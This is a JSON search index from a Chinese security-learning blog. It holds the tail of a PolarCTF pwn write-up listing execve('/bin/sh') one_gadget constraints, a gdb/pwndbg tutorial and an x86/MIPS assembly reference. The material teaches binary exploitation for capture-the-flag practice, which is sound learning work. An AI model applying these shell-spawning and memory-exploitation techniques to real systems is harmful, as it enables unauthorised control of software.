...} is a valid argv 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv \u0026#39;\u0026#39;\u0026#39; ","date":"2024-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/test-chinese/","title":"2024PolarCTF秋季个人挑战赛-pwn-wp"},{"content":"1、加载程序到gdb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 将可执行文件a.out加载到gdb调试工具中 $ gdb a.out GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1 Copyright (C) 2018 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... pwndbg: loaded 191 commands. Type pwndbg [filter] for a list. pwndbg: created $rebase, $ida gdb functions (can be used with print/break) Reading symbols from a.out...(no debugging symbols found)...done. pwndbg\u0026gt; 输入Tab键可以查看所有命令 Display all 200 possibilities? (y or n) 输入y显示所有命令 ! breakrva down-silently + brva dprintf - bt dps \u0026lt; bugreport dq ... ... 2、运行程序 1 2 3 4 5 6 7 （常用） pwndbg\u0026gt; start 或 pwndgb\u0026gt; run # start的作用是将程序运行至入口点（此处入口点是gdb工具认为的入口点，不一定是main函数） # run是直接将程序完全执行一遍 3、查看寄存器信息 1 2 3 4 pwndbg\u0026gt; i r i: 查看的意思 r: 寄存器的意思 # 此命令在pwndbg插件中很少用，因为默认情况已显示寄存器的信息 4、显示指定范围的汇编指令 1 2 3 4 5 6 disassemble可简写成disass # 1.显示main函数的汇编代码段 pwndbg\u0026gt; disassemble main # 2.显示rip寄存器指向的汇编代码段 pwndbg\u0026gt; disassemble $rip #要使用$符号指定寄存器 5、设置显示的汇编指令格式为intel 1 2 3 4 pwndbg\u0026gt; set disassembly-flavor intel #此命令很少使用，因为在pwndbg工具中默认显示的指令格式为intel #若要更改为amd指令，可设置为set disassembly-flavor att #如果没有pwndbg插件的话，可以编辑~/.gdbinit文件，添加该命令 6、指令执行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 1.执行单条汇编指令 pwndbg\u0026gt; ni # 2.步入汇编指令 pwndbg\u0026gt; si # ni和si的区别在于，ni不会进入函数内部，si会进入函数内部 # n s 和 ni si 的区别是，n s 针对的是源代码，ni si针对的是汇编指令 # n是next的意思 # --------------------------------------------------- # 3.跳出函数 pwndbg\u0026gt; finish 当使用si进入某函数调试，需要跳出当前函数时，使用finish命令可以跳出 7、断点设置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 1.在0x000abc地址处设置断点 pwndbg\u0026gt; b * 0x000abc # 通过偏移进行断点设置(如偏移值为0x00001124) pwndbg\u0026gt; b *$rebase(0x00001124) # 2.查看断点 pwndbg\u0026gt; i b # 3.将程序运行至断点处 pwndbg\u0026gt; c # 4.设置某断点失效 pwndbg\u0026gt; disable b id id指的是断点的编号 # 5.恢复某失效的断点 pwndbg\u0026gt; enable b id # 6.删除断点 pwndbg\u0026gt; d id 8、打印操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # 1.打印rip寄存器的值 pwndbg\u0026gt; print $rip # 2.打印rip-0x10的地址值 pwndbg\u0026gt; print $rip-0x10 print命令一般很少用 # 3.打印结构体 pwndbg\u0026gt; ptype stdout 使用x命令打印内容（非常重要，经常使用） # 1.打印rip寄存器指向的地址后20条指令 pwndbg\u0026gt; x/20i $rip x:打印 20:打印的记录数 i:以指令的形式显示 其中i可以替换为下面的形式： x：按16进制格式显示变量 d：按10进制格式显示变量 u：按10进制格式显示无符号整型 o：按8进制格式显示变量 t：按2进制格式显示变量 a：按16进制格式显示变量 c：按字符格式显示变量 f：按浮点格式显示变量 # 2.打印rip寄存器指向的地址后20条数据(包括rip的数据) pwndbg\u0026gt; x/20b $rip b：表示1字节 h：表示2字节 w：表示4字节 g：表示8字节 # 3.可以复合使用，如：打印rip寄存器后20条的数据(包括rip的数据)，以1字节的方式输出(十六进制显示) pwndbg\u0026gt; x/20bx $rip # telescope：将指定内存空间按照stack命令的格式进行显示 pwndbg\u0026gt; telescope 0x555555558000 20 00:0000│ 0x555555558000 (data_start) ◂— 0x0 01:0008│ 0x555555558008 (__dso_handle) ◂— 0x555555558008 02:0010│ 0x555555558010 ◂— 0x0 03:0018│ 0x555555558018 ◂— 0x0 04:0020│ 0x555555558020 (stdout@GLIBC_2.2.5) —▸ 0x7ffff7e1b780 (_IO_2_1_stdout_) ◂— 0xfbad2084 ... ... 9、设置内存值 1 2 3 4 5 6 7 8 9 10 # 1.设置0x00abc的内存值为0x61 pwndbg\u0026gt; set *0x00abc=0x61 # 2.通过寄存器的方式设置内存值 pwndbg\u0026gt; set * ((unsigned long)$rbp) = 0x61 注：若程序是64位，则强制转换的类型为long，若程序是32位，则强制转换的类型是int # 3.设置$rax+0x10的内存值为0xabcdef pwndbg\u0026gt; set *((unsigned long)$rax+0x10)=0xabcdef 注：若程序是64位，则强制转换的类型为long，若程序是32位，则强制转换的类型是int 10、打印函数地址 1 2 打印函数名为func的地址(有符号表就可以打印出来) pwndbg\u0026gt; print \u0026amp;func 11、打印栈地址 1 2 3 4 5 6 # 1.打印栈信息 pwndbg\u0026gt; stack # 2.打印栈地址附近的30条信息 pwndbg\u0026gt; stack 30 注意：打印的第一条记录是rsp/esp指向的位置信息 12、cyclic构建字符 1 2 3 4 5 6 7 # 1.创建30个字符 pwndbg\u0026gt; cyclic 30 aaaabaaacaaadaaaeaaafaaagaaaha # 2.计算生成的字符所在位置 pwndbg\u0026gt; cyclic -l iaaa 32 13、打印字符串的地址 1 2 # 1.打印字符串\u0026#34;/bin/sh\u0026#34;所在的地址 pwndbg\u0026gt; search \u0026#34;/bin/sh\u0026#34; 14.查看内存 1 pwndbg\u0026gt; vmmap 15.查看plt、got、elf 1 2 3 4 5 6 # 1、查看plt表 pwndbg\u0026gt; plt # 2、查看got表 pwndbg\u0026gt; got # 3、查看elf表 pwndbg\u0026gt; elf 16.子进程调试设置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 1.设置调试父进程/子进程 set follow-fork-mode [parent|child] # 2.查询当前fork模式 show follow-fork-mode # 3.设置其它线程不执行，只有调试线程执行 set scheduler-locking [on|off|step] # 4.显示线程 info thread # 5.切换线程 thread id # 6.GDB为特定线程设置断点 break location thread id 17.寻找TLS结构体地址 1 2 # 查找TLS结构体地址的gdb命令 fsbase 18、堆的相关操作 1 2 3 4 5 6 7 8 9 10 11 # 查看堆块内容情况 \u0026gt; vis # 查看bins结构 \u0026gt; bins # 查看分配的堆块 \u0026gt; heap # 查看堆块状态 \u0026gt; par w、pwndbg显示设置 若需要将pwndbg的显示放在第二个终端，则在~/.gdbinit文件处添加以下内容\n1 set context-output /dev/pts/1 x、退出gdb调试 1 2 pwndbg\u0026gt; quit 或者可以直接简写：q 后续有待补充\u0026hellip; \u0026hellip;\n","date":"2024-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/","title":"gdb动态调试工具使用（使用pwndbg插件）"},{"content":"1.Intel指令 指令 描述 例子 解释 mov 传送数据 mov rax,18 将18的值传送进rax寄存器(rax = 18) add 加法运算 add rax,rbx rax与rbx的值相加，并存储在rax(rax = rax + rbx) sub 减法运算 sub rax,9 rax减9，将结果存储在rax(rax = rax - 9) xor 异或运算 xor rax,rax 将rax与rax进行异或处理,等价于：(rax = 0) call 调用函数 lea 取地址，现在一般用于运算 lea rax,[rbp - 18] 将rbp-18的结果传送到rax(rax = rbp - 18) cmp 判断指令，实际作用是做减法运算，通常搭配J开头的命令进行使用 cmp rax,0x61 进行rax - 0x61运算，此命令不会将运算的结果值存储(rax - 0x61) movzx 传送数据 movzx rax,BYTE ptr [rbp-0x10] 相当于将rbp-0x10地址的值，取8位数字传送至rax处BYTE:8位WORD:16位DWORD:32位QWORD:64位 push 压栈 push ebp 等同于：mov esp,esp - 4mov [esp],ebp[]的作用是取寄存器里的地址指向的值没有[]的作用是取寄存器的地址 pop 弹栈 pop ebp 等同于mov ebp,[esp]mov esp,esp+4 leave 返回上级函数时，恢复原本栈空间 leave mov esp,ebppop ebp ret 返回上级函数后，执行上级函数的指令 ret 等同于pop eip（这条指令实际是不存在的，不能直接向RIP寄存器传送数据） call 调用指定函数，注意，调用函数时，push eip的值实际上eip下一条指令的地址值 call dofunc 等同于push eipjmp dofunc nop 无操作，仅使ip指令+1，对应的指令是：\\x90 test 测试指定寄存器中的值与另一个值（常数或寄存器）的按位与操作结果，而不改变寄存器的值。如果结果为零，将设置零标志位ZF。 test rax,rax 指令 描述 标记位 JE,JZ 结果为0则跳转（相等时跳转） ZF=1 JNE,JNZ 结果不为0则跳转（不相等时则跳转） ZF=0 JS 结果为负跳转 SF=1 JNS 结果为非负跳转 SF=0 JP,JPE 结果中1的个数为偶数则跳转 PF=1 JNP,JPO 结果中1的个数为奇数则跳转 PF=0 JO 结果溢出了则跳转 OF=1 JNO 结果没有溢出则跳转 OF=0 JB,JNAE 小于则跳转（无符号数） CF=1 JNB,JAE 大于等于则跳转（无符号数） CF=0 JBE,JNA 小于等于则跳转（无符号数） CF=1 or ZF=1 JNBE,JA 大于则跳转（无符号数） CF=0 and ZF=0 JL,JNGE 小于则跳转（有符号数） SF≠OF JNL,JGE 大于等于则跳转（有符号数） SF=OF JLE,JNG 小于等于则跳转（有符号数） ZF=1 or SF≠OF JNLE,JG 大于则跳转（有符号数） ZF=0 and SF=OF 2.mips指令 寄存器的作用\n1 2 3 4 5 6 7 8 9 10 11 $0：$zero 常量0(constant value 0) $1：$at 保留给汇编器(Reserved for assembler) $2-$3：$v0-$v1 函数调用返回值(values for results and expression evaluation) $4-$7：$a0-$a3 函数调用参数(arguments) $8-$15：$t0-$t7 暂时的(或随便用的) $16-$23：$s0-$s7 保存的(或如果用，需要SAVE/RESTORE的)(saved) $24-$25：$t8-$t9 暂时的(或随便用的) $28：$gp 全局指针(Global Pointer) $29：$sp 堆栈指针(Stack Pointer) $30：$fp/$s8 栈帧指针(Frame Pointer) $31：$ra 返回地址(return address) 指令 描述 例子 解释 j 跳转至标签处，相当于jmp指令 jr 跳转至寄存器里的地址指向的值，通常函数的返回处使用的指令为jr指令 jr $ra 将pc指令指向$ra寄存器里的值 jal 跳转指令，返回地址存储在$ra寄存器中，一般用于函数调用 jmp 目标地址mov fp,sp jalr 与jal指令类似，只不过jal的对象为寄存器 la 相当于x86的lea sw sw $ra, 0x5c($sp) 把$ra的内容写入到[$sp+0x5c]中 后续有待补充\u0026hellip; \u0026hellip;\n","date":"2024-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/pwn-%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/","title":"pwn-常见汇编指令学习"}]